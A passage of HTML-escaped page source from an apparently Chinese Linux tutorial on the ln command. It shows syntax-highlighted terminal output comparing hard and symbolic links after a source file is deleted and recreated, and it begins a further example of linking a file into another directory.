&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-23&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;ln2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-25&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xrw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-27&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-29&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# vi log2013.log &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-31&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-33&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;02&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-35&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-37&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;04&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-39&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;05&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-41&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-43&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-45&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-46&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-47&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;09&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-49&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-50&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-51&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-53&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-54&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-55&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-56&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-57&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;ln2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-58&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-59&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-60&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-61&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cat link2013 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-62&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-63&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-64&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-65&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;02&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-66&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-67&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-68&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-69&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;04&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-70&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-71&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;05&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-72&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-73&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-74&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-75&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-76&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-77&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-78&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-79&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;09&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-80&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-81&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-82&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-83&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-84&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-85&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-86&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-87&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cat ln2013 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-88&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-89&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;hostnamebaidu&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;baidu&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.com&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-90&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-91&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;hostnamesina&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sina&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.com&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-92&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-93&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;hostnames&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;true&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0092 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;1.源文件被删除后，并没有影响硬链接文件；软链接文件在centos系统下不断的闪烁，提示源文件已经不存在&lt;/p&gt;
&lt;p&gt;2.重建源文件后，软链接不在闪烁提示，说明已经链接成功，找到了链接文件系统；重建后，硬链接文件并没有受到源文件影响，硬链接文件的内容还是保留了删除前源文件的内容，说明硬链接已经失效&lt;/p&gt;
&lt;p&gt;实例4：将文件链接为另一个目录中的相同名字&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f3934f166828781&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
ln log2013.log test3&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
